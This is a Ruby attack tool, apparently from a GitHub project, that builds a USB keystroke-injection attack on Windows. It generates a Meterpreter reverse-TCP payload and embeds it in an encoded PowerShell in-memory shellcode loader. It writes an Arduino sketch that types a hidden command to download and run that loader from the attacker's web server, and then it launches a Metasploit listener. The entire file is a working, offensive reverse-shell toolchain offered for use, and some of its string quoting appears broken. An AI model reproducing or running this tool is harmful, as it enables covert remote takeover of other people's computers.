#!/usr/bin/env ruby
#Thanks to @mattifestation exploit-monday.com and Dave Kennedy.
#Works for Arduino Leonardo and others
#Code By @Sirage7474
#https://github.com/Sirage7474/ReverseAccess

require 'base64'
require 'readline'
def print_error(text)
print "\e[31m[-]\e[0m #{text}"
end

def print_success(text)
print "\e[32m[+]\e[0m #{text}"
end

def print_info(text)
print "\e[34m[*]\e[0m #{text}"
end

def get_input(text)
print "\e[33m[!]\e[0m #{text}"
end

def rgets(prompt = '', default = '')
choice = Readline.readline(prompt, false)
choice == default if choice == ''
choice
end

def select_host
host_name = rgets('Enter the host ip to listen on: ')
ip = host_name.split('.')
if ip[0] == nil? || ip[1] == nil? || ip[2] == nil? || ip[3] == nil?
print_error("Not a valid IP\n")
select_host
end
print_success("Using #{host_name} as server\n")
host_name
end

def select_port
port = rgets('Choose Port or Leave Blank For [4444]: ')
if port == ''
port = '4444'
print_success("Using #{port}\n")
return port
elsif !(1..65_535).cover?(port.to_i)
print_error("Not a Valid Port\n")
sleep(1)
select_port
else
print_success("Using #{port}\n")
return port
end
end

def shellcode_gen(msf_path, host, port)
print_info("Shellcode is being generated\n")
msf_command = "#{msf_path}./msfvenom --payload "
msf_command << "#{@set_payload} LHOST=#{host} LPORT=#{port} -f c"
execute  = #{msf_command}
shellcode = clean_shellcode(execute)
powershell_command = powershell_string(shellcode)
final = to_ps_base64(powershell_command)
final
end

def clean_shellcode(shellcode)
shellcode = shellcode.gsub('\', ',0')
shellcode = shellcode.delete('+')
shellcode = shellcode.delete('"')
shellcode = shellcode.delete("\n")
shellcode = shellcode.delete("\s")
shellcode[0..18] = ''
shellcode
end

def to_ps_base64(command)
Base64.encode64(command.split('').join("\x00") << "\x00").gsub!("\n", '')
end

def powershell_string(shellcode)
s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
s << "uint flProtect);[DllImport("kernel32.dll")]public static extern "
s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
s << "IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern "
s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
s << '$i++) {$w::memset(IntPtr, $sc[$i], 1)};$w::'
s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
s << %("\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni )
s << %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& )
s << %(powershell $cmd $gq";})
end

def shell_setup(encoded_command)
print_info("Writing to shell file\n")
s = "powershell -nop -wind hidden -noni -enc #{encoded_command}"
File.open('/var/www/html/shell.txt', 'w') do |f|
f.write(s)
end
print_success("Shell File Is Done\n")
end

def arduino_setup(host)
print_info("Writing Arduino Sketch File\n")
s = "#include <Keyboard.h>\n"
s << "void setup()\n"
s << "{\n"
s << "Keyboard.begin();\n"
s << "Keyboard.press(KEY_LEFT_GUI);\n"
s << "delay(1000);\n"
s << "Keyboard.press('x');\n"
s << "Keyboard.releaseAll();\n"
s << "delay(500);\n"
s << "typeKey('a');\n"
s << "delay(100);\n"
s << "Keyboard.press(KEY_LEFT_ALT);\n"
s << "delay(500);\n"
s << "Keyboard.press('y');\n"
s << "Keyboard.releaseAll();\n"
s << "delay(500);\n"
s << "Keyboard.print("powershell -windowstyle hidden \"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\"");\n"
s << "typeKey(KEY_RETURN);\n"
s << "Keyboard.end();\n"
s << "}\n"
s << "void loop() {}\n"
s << "void typeKey(int key){\n"
s << "Keyboard.press(key);\n"
s << "delay(500);\n"
s << "Keyboard.release(key);\n"
s << "}"
File.open('reverse_shell_arduino.txt', 'w') do |f|
f.write(s)
end
print_success("Arduino Sketch File Complete Please Find 'reverse_shell_arduino.txt'\n")
end

def metasploit_setup(msf_path, host, port)
print_info("Setting up Apache server for hosting shell file\n")
system("service apache2 start")

print_info("Setting up Metasploit this may take a sec\n")
rc_file = 'msf_listener.rc'
file = File.open("#{rc_file}", 'w')
file.write("use exploit/multi/handler\n")
file.write("set PAYLOAD #{@set_payload}\n")
file.write("set LHOST #{host}\n")
file.write("set LPORT #{port}\n")
file.write("set EnableStageEncoding true\n")
file.write("set ExitOnSession false\n")
file.write('exploit -j')
file.close
system("#{msf_path}./msfconsole -r #{rc_file}")
end

begin
if File.exist?('/usr/bin/msfvenom')
msf_path = '/usr/bin/'
elsif File.exist?('/opt/metasploit-framework/msfvenom')
msf_path = ('/opt/metasploit-framework/')
else
print_error('Metasploit Not Found!')
exit
end
@set_payload = 'windows/meterpreter/reverse_tcp'
host = select_host
port = select_port
encoded_command = shellcode_gen(msf_path, host, port)
shell_setup(encoded_command)
arduino_setup(host)
msf_setup = rgets('Would you like to start the listener?[yes/no] ')
metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
print_info("Thanks For Using Rᴇᴠᴇʀsᴇ-Sʜᴇʟʟ Made By @Sirage7474\n")
end
